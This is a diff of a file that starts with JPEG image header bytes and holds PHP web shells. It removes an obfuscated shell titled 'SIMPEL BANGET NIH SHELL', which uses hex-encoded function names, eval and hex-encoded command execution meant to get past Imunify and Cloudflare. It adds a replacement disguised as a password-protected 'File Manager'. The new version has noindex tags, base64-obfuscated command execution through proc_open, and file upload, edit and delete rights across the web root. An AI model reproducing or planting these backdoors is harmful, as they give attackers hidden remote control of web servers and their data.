@@ -8,574 +8,426 @@
 %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
 ������w�!1AQaq"2�B����	#3R�br�
 $4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?�����N����m?����j����EP��
-<?php
-
-/*
- * This file just for test for server who using imunify,cloudflare etc,
- *
- * (c) Setsuna Watanabe <yucaerin@hotmail.com>
- *
- * GOOD LUCK, HAVE FUN!
- */
-
-session_start();
-error_reporting(E_ALL);
-header("X-XSS-Protection: 0");
-ob_start();
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', FALSE);
-
-$Array = [
-    '6d6b',
-    '646972',
-    '6765745f66696c655f7065726d697373696f6e73',
-    '69735f7772697461626c655f7065726d697373696f6e',
-    '65786563757465436f6d6d616e64',
-    '70726f635f6f70656e',
-    '73747265616d5f6765745f636f6e74656e7473',
-    '66696c655f6765745f636f6e74656e7473',
-    '66696c655f7075745f636f6e74656e7473',
-    '62696e32686578',
-    '6d6f76655f75706c6f616465645f66696c65',
-    '68746d6c7370656369616c6368617273',
-    '6865783262696e',
-    '7068705f756e616d65',
-    '7363616e646972',
-    '69735f646972',
-    '66696c655f657869737473',
-    '7265616466696c65',
-    '66696c6573697a65',
-    '69735f7772697461626c65',
-    '72656e616d65',
-    '66696c657065726d73',
-    '737072696e7466',
-    '737562737472',
-    '66636c6f7365',
-    '70726f635f6f70656e',
-    '69735f7265736f75726365',
-    '70726f635f636c6f7365',
-    '756e6c696e6b',
-    '69735f66696c65',
-    '4554', //30
-    '564552',
-    '53494f4e',
-    '4c4553',
-    '5354',
-];
-
-$SETSUNA = [];
-foreach ($Array as $hexString) {
-    $SETSUNA[] = hex2bin($hexString);
-}
-
-$satu = '_G';
-$dua = $SETSUNA[30];
-$tiga = '_SER';
-$empat = $SETSUNA[31];
-$lima = '_SES';
-$enam = $SETSUNA[32];
-$tujuh = '_FI';
-$delapan = $SETSUNA[33];
-$sembilan = '_PO';
-$sepuluh = $SETSUNA[34];
-
-// Gunakan $SETSUNA sesuai kebutuhan
-$a = $SETSUNA[0];
-$b = $SETSUNA[1];
-$c = $a . $b;
-$L = eval('return $' . $satu . $dua . ';');
-$M = eval('return $' . $tiga . $empat . ';');
-$N = eval('return $' . $lima . $enam . ';');
-$e = eval('return $' . $tujuh . $delapan . ';');
-$o = eval('return $' . $sembilan . $sepuluh . ';');
-$f = $SETSUNA[2];
-$g = $SETSUNA[3];
-$h = $SETSUNA[4];
-$i = $SETSUNA[5];
-$j = $SETSUNA[6];
-$q = $SETSUNA[7];
-$s = $SETSUNA[8];
-$v = $SETSUNA[9];
-$w = $SETSUNA[10];
-$y = $SETSUNA[11];
-$z = $SETSUNA[12];
-$NM = $SETSUNA[13];
-$SCN = $SETSUNA[14];
-$ID = $SETSUNA[15];
-$FE = $SETSUNA[16];
-$RF = $SETSUNA[17];
-$FS = $SETSUNA[18];
-$IW = $SETSUNA[19];
-$RNM = $SETSUNA[20];
-$FP = $SETSUNA[21];
-$SPRF = $SETSUNA[22];
-$SBSR = $SETSUNA[23];
-$FCL = $SETSUNA[24];
-$PROP = $SETSUNA[25];
-$IR = $SETSUNA[26];
-$PRCL = $SETSUNA[27];
-$UNL = $SETSUNA[28];
-$ISF = $SETSUNA[29];
-
-$dir = isset($L['dir']) ? $z($L['dir']) : '.';
-$files = $SCN($dir);
-$upload_message = '';
-$edit_message = '';
-$delete_message = '';
-$create_dir_message = '';
-
-// Function to create a new directory
-function createDirectory($dir, $newDirectoryName)
-{
-    $newDirPath = $dir . '/' . $newDirectoryName;
-
-        global $ID;
-    if (!$ID($newDirPath)) {
-        global $c;
-        if ($c($newDirPath, 0755, true)) {
-            return "Directory '$newDirectoryName' created successfully.";
-        } else {
-            return "Failed to create directory. Check directory permissions or other errors.";
-        }
-    } else {
-        return "Directory '$newDirectoryName' already available.";
-    }
-}
-
-// Function to Download
-if (isset($L['download'])) {
-    $fileToDownload = $z($L['download']);
-    global $FS;
-    // Make sure that the requested file exists
-    if ($FE($fileToDownload)) {
-        // Set header to trigger download
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . $FS($fileToDownload));
-        $RF($fileToDownload);
-        exit;
-    } else {
-        // Handle jika file tidak ditemukan
-        echo "File not found.";
-    }
-}
-
-// Function to get file permissions
-function f($file): string {
-    global $FP, $SPRF, $SBSR;
-    return $SBSR($SPRF('%o', $FP($file)), -4);
-}
-
-// Function to check write permissions
-function g($file): bool {
-    global $IW;
-    return $IW($file);
-}
-
-// Function to execute a command
-function h($command, $workingDirectory = null)
-{
-    global $j, $FCL, $PROP, $IR, $PRCL;
-
-    $descriptorspec = array(
-       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-    );
-
-    $process = $PROP($command, $descriptorspec, $pipes, $workingDirectory);
-
-    if ($IR($process)) {
-        // Read output from stdout and stderr
-        $output_stdout = $j($pipes[1]); // Ganti dengan $SETSUNA[6] jika diperlukan
-        $output_stderr = $j($pipes[2]); // Ganti dengan $SETSUNA[6] jika diperlukan
-
-        $FCL($pipes[0]);
-        $FCL($pipes[1]);
-        $FCL($pipes[2]);
-
-        $return_value = $PRCL($process);
-
-        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
-    } else {
-        return "Failed to execute command.";
-    }
-}
-
-
-if (isset($L['636d64'])) {
-    $command = $z($L['636d64']);
-    $result = h($command, $dir);
-}
-
-if (isset($e['file_upload'])) {
-    $tempFile = $e['file_upload']['tmp_name'];
-    $targetFile = $dir . '/' . $e['file_upload']['name'];
-    if ($w($tempFile, $targetFile)) {
-        $upload_message = 'File uploaded successfully.';
-    } else {
-        $upload_message = 'Failed to upload file.';
-    }
-}
-
-//function for edit file
-if (isset($o['edit_file'])) {
-    $file = $o['edit_file'];
-    $content = $q($file);
-    if ($content !== false) {
-        ?>
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Edit File</title>
-            <style>
-                body {
-                    font-family: Arial, sans-serif;
-                    margin: 0;
-                    padding: 0;
-                    text-align: center;
-                }
-                header {
-                    background-color: #4CAF50;
-                    color: white;
-                    padding: 1rem;
-                }
-                header h1 {
-                    margin: 0;
-                }
-                main {
-                    padding: 1rem;
-                }
-                form {
-                    width: 50%;
-                    margin: auto;
-                    text-align: left;
-                }
-                textarea {
-                    width: 100%;
-                    height: 300px;
-                }
-                input[type="submit"] {
-                    background-color: #4CAF50;
-                    border: none;
-                    color: white;
-                    cursor: pointer;
-                    margin-top: 1rem;
-                    padding: 0.5rem 1rem;
-                    text-align: center;
-                    text-decoration: none;
-                    display: inline-block;
-                    font-size: 12px;
-                }
-                input[type="submit"]:hover {
-                    background-color: #45a049;
-                }
-                .btn {
-                    background-color: #4CAF50;
-                    border: none;
-                    color: white;
-                    cursor: pointer;
-                    margin-left: 1rem;
-                    padding: 0.5rem 1rem;
-                    text-align: center;
-                    text-decoration: none;
-                    display: inline-block;
-                    font-size: 12px;
-                }
-
-                .btn-download {
-                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
-                    border: none;
-                    color: white;
-                    cursor: pointer;
-                    margin-left: 1rem;
-                    padding: 0.5rem 1rem;
-                    text-align: center;
-                    text-decoration: none;
-                    display: inline-block;
-                    font-size: 12px;
-                }
-
-                .btn:hover {
-                    background-color: #45a049;
-                }
-            </style>
-        </head>
-        <body>
-            <header>
-                <h1>Edit File</h1>
-            </header>
-            <main>
-                <form method="post" action="">
-                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo $y($content); ?></textarea>
-                    <input type="hidden" name="edited_file" value="<?php echo $y($file); ?>">
-                    <input type="submit" name="submit_edit" value="Submit">
-                </form>
-            </main>
-        </body>
-        </html>
-        <?php
-        exit;
-    } else {
-        $edit_message = 'Gagal membaca isi file.';
-    }
-}
-
-if (isset($o['submit_edit'])) {
-    $file = $o['edited_file'];
-    $content = $o['file_content'];
-    if ($s($file, $content) !== false) {
-        $edit_message = 'File Edit Successfully.';
-    } else {
-        $edit_message = 'Failed To Edit File.';
-    }
-}
-
-if (isset($o['delete_file'])) {
-    global $UNL;
-    $file = $o['delete_file'];
-    if ($UNL($file)) {
-        $delete_message = 'File deleted successfully.';
-    } else {
-        $delete_message = 'Failed to delete file.';
-    }
-}
-
-if (isset($o['create_dir'])) {
-    $newDirName = $o['new_dir_name'];
-    $create_dir_message = createDirectory($dir, $newDirName);
-}
-
-// Proses form rename jika disubmit
-if ($M['REQUEST_METHOD'] === 'POST') {
-    if (isset($o['old_name']) && isset($o['new_name'])) {
-        $old_name = $o['old_name'];
-        $new_name = $o['new_name'];
-
-        $old_path = $dir . '/' . $old_name;
-        $new_path = $dir . '/' . $new_name;
-
-        if ($RNM($old_path, $new_path)) {
-            global $RNM, $y;
-            showMessage("Successfully changed the name from $old_name to $new_name.", $y);
-        } else {
-            global $y;
-            showMessage("Failed To Change The Name. Make sure the old file/directory name is correct.", $y);
-        }
-    }
-}
-
-// Fungsi untuk menampilkan pesan
-function showMessage($message, $y)
-{
-    echo '<p>' . z($message) . '</p>';
-}
-
-$un = $NM();
-$current_dir = realpath($dir);
-?>
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
+    <title>File Manager</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIMPEL BANGET NIH SHELL</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa;
             margin: 0;
-            padding: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        .header h1 {
+            font-size: 28px;
             text-align: center;
+            margin-bottom: 20px;
+            color: #343a40;
         }
-        header {
-            background-color: #4CAF50;
+        .subheader p {
+            font-size: 16px;
+            text-align: center;
+            color: #6c757d;
+            font-style: italic;
+        }
+        .result-box {
+            width: 100%;
+            height: 200px;
+            padding: 10px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            background-color: #f1f3f5;
+            overflow: auto;
+            font-family: 'Roboto', sans-serif;
+            color: #343a40;
+        }
+        .result-box:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        .result-box::-webkit-scrollbar {
+            width: 8px;
+        }
+        .result-box::-webkit-scrollbar-thumb {
+            background-color: #007bff;
+            border-radius: 4px;
+        }
+        form input[type="text"], form textarea, form select, form input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            font-family: 'Roboto', sans-serif;
+        }
+        form input[type="submit"], form input[type="file"] {
+            padding: 10px;
+            background-color: #007bff;
             color: white;
-            padding: 1rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
         }
-        header h1 {
-            margin: 0;
-        }
-        main {
-            padding: 1rem;
+        form input[type="submit"]:hover {
+            background-color: #0056b3;
         }
         table {
+            width: 100%;
             border-collapse: collapse;
-            margin: 1rem auto;
-            width: 50%;
+            margin-top: 20px;
         }
         th, td {
-            border: 1px solid #ddd;
-            padding: 0.5rem;
+            padding: 12px;
             text-align: left;
+            border-bottom: 1px solid #dee2e6;
         }
         th {
-            background-color: #f2f2f2;
+            background-color: #007bff;
+            color: white;
         }
         tr:nth-child(even) {
-            background-color: #f2f2f2;
+            background-color: #f8f9fa;
         }
-        tr:hover {
-            background-color: #ddd;
+        .item-name {
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
-        form {
-            display: inline-block;
-            margin: 1rem 0;
+        .permission.writable {
+            color: #28a745;
         }
-        input[type="submit"] {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            cursor: pointer;
-            margin-left: 1rem;
-            padding: 0.5rem 1rem;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 12px;
+        .permission.not-writable {
+            color: #dc3545;
         }
-        input[type="submit"]:hover {
-            background-color: #45a049;
-        }
-        /* Gaya CSS untuk hasil command */
-        div {
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            padding: 10px;
-            margin-top: 20px;
-            overflow: auto;
-        }
-
-        pre {
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-
-        .btn {
-            background-color: #4CAF50;
-            border: none;
-            color: white;
-            cursor: pointer;
-            margin-left: 1rem;
-            padding: 0.5rem 1rem;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 12px;
-        }
-
-        .btn-download {
-            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
-            border: none;
-            color: white;
-            cursor: pointer;
-            margin-left: 1rem;
-            padding: 0.5rem 1rem;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
-            font-size: 12px;
-        }
-
-        .btn:hover {
-            background-color: #45a049;
+        .login-container {
+            max-width: 400px;
+            margin: 50px auto;
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>SIMPEL BANGET NIH SHELL</h1>
-    </header>
-    <main>
-        <p>Current directory: <?php echo($current_dir); ?></p>
-        <p>Server information: <?php echo $un; ?></p>
-        <?php if (!empty($upload_message)): ?>
-        <p><?php echo($upload_message); ?></p>
-        <?php endif; ?>
-        <?php if (!empty($edit_message)): ?>
-        <p><?php echo($edit_message); ?></p>
-        <?php endif; ?>
-        <?php if (!empty($delete_message)): ?>
-        <p><?php echo($delete_message); ?></p>
-        <?php endif; ?>
-        <?php if (!empty($create_dir_message)): ?>
-        <p><?php echo($create_dir_message); ?></p>
-        <?php endif; ?>
-        <form method="POST" enctype="multipart/form-data">
-            <label>Upload file:</label>
-            <input type="file" name="file_upload">
-            <input type="submit" value="Upload">
-            <input type="hidden" name="dir" value="<?php echo($dir); ?>">
-        </form>
-        </br>
-        <form method="POST">
-            <label>Create directory:</label>
-            <input type="text" name="new_dir_name" required>
-            <input type="submit" name="create_dir" value="Create">
-            <input type="hidden" name="dir" value="<?php echo($dir); ?>">
-        </form>
-        </br>
-            <form action="" method="post">
-            <label>Name file/Directory:</label> <input name="old_name" type="text">
-            <label>New Name File/Directory:</label> <input name="new_name" type="text">
-            <input type="submit" value="Change Name">
-        </form>
-        <table>
-            <tr>
-                <th>Filename</th>
-                <th>Permissions</th>
-                <th>Actions</th>
-            </tr>
-            <?php foreach ($files as $file): ?>
-            <tr>
-                <td>
-                    <?php if ($ID($dir . '/' . $file)): ?>
-                    <a href="?dir=<?php echo $v($dir . '/' . $file); ?>" style="color: <?php echo g($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
-                    <?php else: ?>
-                    <?php echo $file; ?></a>
-                    <?php endif; ?>
-                </td>
-                <td style="color: <?php echo g($dir . '/' . $file) ? 'green' : 'red'; ?>">
-                    <?php echo $ISF($dir . '/' . $file) ? f($dir . '/' . $file) : (g($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
-                </td>
-                <td>
-                    <?php if ($ISF($dir . '/' . $file)): ?>
-                    <form action="" method="post" style="display: inline-block;">
-                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
-                        <button type="submit" class="btn btn-download">Edit</button>
-                    </form>
-                    <form action="" method="post" style="display: inline-block;">
-                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
-                        <button type="submit" class="btn btn-download">Delete</button>
-                    </form>
-                    <form action="" method="get" style="display: inline-block;">
-                    <input type="hidden" name="download" value="<?php echo bin2hex($dir . '/' . $file); ?>">
-                    <button type="submit" class="btn btn-download">Download</button>
-                    </form>
-                    <?php endif; ?>
-                </td>
-            </tr>
-            <?php endforeach; ?>
-        </table>
-        <p><b>Command Execution Bypass</b></p>
-        <form method="GET">
-            <label>encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
-            <input type="hidden" name="dir" value="<?php echo $v($dir); ?>">
-            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
-            <input type="submit" value="Execute">
-        </form>
-        <?php if (isset($result)): ?>
-            <div>
-                <h2>Command Result:</h2>
-                <pre><?php echo $y($result); ?></pre>
+<?php
+session_start();
+
+// Simulasi database pengguna dengan hash bcrypt
+$users = [
+    'admin' => '$2a$12$GIAfPWf9fdJuk7wMBnIh.Omqg7onjtsPv2oaxEYN6HoUEbIKctlK2' // Hash bcrypt untuk password
+];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+
+    if (isset($users[$username]) && password_verify($password, $users[$username])) {
+        $_SESSION['loggedin'] = true;
+        $_SESSION['username'] = $username;
+    } else {
+        echo "<div class='alert alert-danger text-center'>Username atau password salah!</div>";
+    }
+}
+
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    ?>
+    <div class="container login-container">
+        <div class="header">
+            <h1>Login File Manager</h1>
+        </div>
+        <form method="post" action="">
+            <div class="mb-3">
+                <label for="username" class="form-label">Username</label>
+                <input type="text" name="username" id="username" class="form-control" required>
             </div>
-        <?php endif; ?>
-    </main>
+            <div class="mb-3">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" name="password" id="password" class="form-control" required>
+            </div>
+            <button type="submit" name="login" class="btn btn-primary w-100">Login</button>
+        </form>
+    </div>
+    <?php
+    exit;
+}
+?>
+
+<div class="container">
+    <div class="header">
+        <h1>File Manager</h1>
+        <p>Selamat datang, <?php echo htmlspecialchars($_SESSION['username']); ?> | <a href="?logout=true" class="text-danger">Logout</a></p>
+    </div>
+    <div class="subheader">
+        <p>Kelola file dan folder dengan mudah</p>
+    </div>
+
+    <?php
+    if (isset($_GET['logout'])) {
+        session_destroy();
+        header("Location: ?");
+        exit;
+    }
+
+    date_default_timezone_set(date_default_timezone_get());
+    $baseDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+    $currentDirectory = realpath(isset($_GET['d']) ? base64_decode($_GET['d']) : $baseDirectory);
+    chdir($currentDirectory);
+
+    $viewCommandResult = '';
+
+    function encode($str) {
+        return base64_encode($str);
+    }
+
+    function decode($str) {
+        return base64_decode($str);
+    }
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login'])) {
+        if (isset($_FILES['fileToUpload'])) {
+            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
+            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+                echo "<div class='alert alert-success'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah.</div>";
+            } else {
+                echo "<div class='alert alert-danger'>Maaf, terjadi kesalahan saat mengunggah file.</div>";
+            }
+        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+            if (!file_exists($newFolder)) {
+                if (mkdir($newFolder)) {
+                    echo "<div class='alert alert-success'>Folder berhasil dibuat!</div>";
+                } else {
+                    echo "<div class='alert alert-danger'>Gagal membuat folder!</div>";
+                }
+            } else {
+                echo "<div class='alert alert-danger'>Folder sudah ada!</div>";
+            }
+        } elseif (isset($_POST['file_name'])) {
+            $fileName = $_POST['file_name'];
+            $newFile = $currentDirectory . '/' . $fileName;
+            if (!file_exists($newFile)) {
+                if (file_put_contents($newFile, '') !== false) {
+                    echo "<div class='alert alert-success'>File $fileName berhasil dibuat!</div>";
+                    $fileToView = $newFile;
+                    if (file_exists($fileToView)) {
+                        $fileContent = file_get_contents($fileToView);
+                        $viewCommandResult = "<div class='alert alert-info'>File: $fileName</div>
+                        <form method='post' action='?".(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '')."'>
+                        <textarea name='content' class='result-box'>" . htmlspecialchars($fileContent) . "</textarea>
+                        <input type='hidden' name='edit_file' value='$fileName'>
+                        <input type='submit' value='Simpan' class='btn btn-primary'></form>";
+                    } else {
+                        $viewCommandResult = "<div class='alert alert-danger'>File tidak ditemukan!</div>";
+                    }
+                } else {
+                    echo "<div class='alert alert-danger'>Gagal membuat file!</div>";
+                }
+            } else {
+                echo "<div class='alert alert-danger'>File sudah ada!</div>";
+            }
+        } elseif (isset($_POST['cmd_biasa'])) {
+            $encodedCommand = $_POST['cmd_biasa'];
+            $command = base64_decode($encodedCommand);
+            $descriptorspec = [
+                0 => ['pipe', 'r'],
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $process = proc_open($command, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                $errors = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                proc_close($process);
+                if (!empty($errors)) {
+                    $viewCommandResult = "<div class='alert alert-danger'>Error:</div><textarea class='result-box'>" . htmlspecialchars($errors) . "</textarea>";
+                } else {
+                    $viewCommandResult = "<div class='alert alert-info'>Hasil:</div><textarea class='result-box'>" . htmlspecialchars($output) . "</textarea>";
+                }
+            } else {
+                $viewCommandResult = "<div class='alert alert-danger'>Gagal menjalankan perintah!</div>";
+            }
+        } elseif (isset($_POST['view_file'])) {
+            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+            if (file_exists($fileToView)) {
+                $fileContent = file_get_contents($fileToView);
+                $viewCommandResult = "<div class='alert alert-info'>File: {$_POST['view_file']}</div>
+                <form method='post' action='?".(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '')."'>
+                <textarea name='content' class='result-box'>" . htmlspecialchars($fileContent) . "</textarea>
+                <input type='hidden' name='edit_file' value='{$_POST['view_file']}'>
+                <input type='submit' value='Simpan' class='btn btn-primary'></form>";
+            } else {
+                $viewCommandResult = "<div class='alert alert-danger'>File tidak ditemukan!</div>";
+            }
+        } elseif (isset($_POST['edit_file'])) {
+            $ef = $currentDirectory . '/' . $_POST['edit_file'];
+            $newContent = $_POST['content'];
+            if (file_put_contents($ef, $newContent) !== false) {
+                echo "<div class='alert alert-success'>File {$_POST['edit_file']} berhasil diedit!</div>";
+            } else {
+                echo "<div class='alert alert-danger'>Gagal mengedit file {$_POST['edit_file']}!</div>";
+            }
+        } elseif (isset($_POST['delete_file'])) {
+            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+            if (file_exists($fileToDelete)) {
+                if (is_dir($fileToDelete)) {
+                    if (deleteDirectory($fileToDelete)) {
+                        echo "<div class='alert alert-success'>Folder berhasil dihapus!</div>";
+                    } else {
+                        echo "<div class='alert alert-danger'>Gagal menghapus folder!</div>";
+                    }
+                } else {
+                    if (unlink($fileToDelete)) {
+                        echo "<div class='alert alert-success'>File berhasil dihapus!</div>";
+                    } else {
+                        echo "<div class='alert alert-danger'>Gagal menghapus file!</div>";
+                    }
+                }
+            } else {
+                echo "<div class='alert alert-danger'>File atau folder tidak ditemukan!</div>";
+            }
+        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+            $oldName = $currentDirectory . '/' . $_POST['old_name'];
+            $newName = $currentDirectory . '/' . $_POST['new_name'];
+            if (file_exists($oldName)) {
+                if (rename($oldName, $newName)) {
+                    echo "<div class='alert alert-success'>Item berhasil diganti nama!</div>";
+                } else {
+                    echo "<div class='alert alert-danger'>Gagal mengganti nama item!</div>";
+                }
+            } else {
+                echo "<div class='alert alert-danger'>Item tidak ditemukan!</div>";
+            }
+        }
+    }
+
+    echo '<hr><strong>Direktori Saat Ini:</strong> ';
+    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+    $currentPath = '';
+    foreach ($directories as $index => $dir) {
+        if (!empty($dir)) {
+            $currentPath .= DIRECTORY_SEPARATOR . $dir;
+            echo "/<a href='?d=" . encode($currentPath) . "'>" . htmlspecialchars($dir) . "</a>";
+        }
+    }
+    echo '<a href="?d=' . encode(dirname(__FILE__)) . '"> / <span class="text-success">[Kembali ke Beranda]</span></a>';
+    echo '<hr>';
+
+    echo '<form method="post" enctype="multipart/form-data" class="mb-3">
+        <div class="input-group">
+            <input type="file" name="fileToUpload" id="fileToUpload" class="form-control">
+            <button type="submit" class="btn btn-primary">Unggah File</button>
+        </div>
+    </form>';
+
+    echo '<div class="row">
+        <div class="col-md-4">
+            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
+                <h5>Buat Folder</h5>
+                <input type="text" name="folder_name" placeholder="Nama Folder" class="form-control">
+                <button type="submit" class="btn btn-primary mt-2">Buat Folder</button>
+            </form>
+        </div>
+        <div class="col-md-4">
+            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
+                <h5>Buat File</h5>
+                <input type="text" name="file_name" placeholder="Nama File" class="form-control">
+                <button type="submit" class="btn btn-primary mt-2">Buat File</button>
+            </form>
+        </div>
+        <div class="col-md-4">
+            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '" id="cmdForm">
+                <h5>Jalankan Perintah</h5>
+                <input type="text" id="cmd_input" name="cmd_biasa" placeholder="Masukkan perintah" class="form-control">
+                <button type="submit" class="btn btn-primary mt-2">Jalankan</button>
+            </form>
+        </div>
+    </div>';
+
+    echo $viewCommandResult;
+
+    echo '<table class="table table-bordered mt-4">
+        <thead>
+            <tr>
+                <th>Nama Item</th>
+                <th>Ukuran</th>
+                <th>Tanggal</th>
+                <th>Perizinan</th>
+                <th>Lihat</th>
+                <th>Hapus</th>
+                <th>Ganti Nama</th>
+            </tr>
+        </thead>
+        <tbody>';
+
+    foreach (scandir($currentDirectory) as $v) {
+        if ($v === '.' || $v === '..') continue;
+        $u = realpath($v);
+        $s = stat($u);
+        $itemLink = is_dir($v) ? '?d=' . encode($currentDirectory . '/' . $v) : '?d=' . encode($currentDirectory) . '&f=' . encode($v);
+        $permission = substr(sprintf('%o', fileperms($u)), -4);
+        $writable = is_writable($u);
+        echo "<tr>
+            <td class='item-name'><a href='$itemLink'>" . htmlspecialchars($v) . "</a></td>
+            <td>" . filesize($u) . "</td>
+            <td>" . date('Y-m-d H:i:s', filemtime($u)) . "</td>
+            <td class='permission " . ($writable ? 'writable' : 'not-writable') . "'>$permission</td>
+            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='view_file' value='" . htmlspecialchars($v) . "'><button type='submit' class='btn btn-sm btn-info'>Lihat</button></form></td>
+            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='delete_file' value='" . htmlspecialchars($v) . "'><button type='submit' class='btn btn-sm btn-danger'>Hapus</button></form></td>
+            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='old_name' value='" . htmlspecialchars($v) . "'><input type='text' name='new_name' placeholder='Nama Baru' class='form-control d-inline-block w-auto'><button type='submit' name='rename_item' class='btn btn-sm btn-warning'>Ganti Nama</button></form></td>
+        </tr>";
+    }
+
+    echo '</tbody></table>';
+
+    function deleteDirectory($dir) {
+        if (!file_exists($dir)) {
+            return true;
+        }
+        if (!is_dir($dir)) {
+            return unlink($dir);
+        }
+        foreach (scandir($dir) as $item) {
+            if ($item == '.' || $item == '..') {
+                continue;
+            }
+            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+                return false;
+            }
+        }
+        return rmdir($dir);
+    }
+    ?>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const cmdForm = document.getElementById('cmdForm');
+        const cmdInput = document.getElementById('cmd_input');
+        if (cmdForm && cmdInput) {
+            cmdForm.addEventListener('submit', function(e) {
+                const plainCommand = cmdInput.value.trim();
+                if (plainCommand) {
+                    // Otomatis enkripsi (encode ke base64) perintah sebelum submit
+                    cmdInput.value = btoa(plainCommand);
+                }
+            });
+        }
+    });
+</script>
 </body>
 </html>
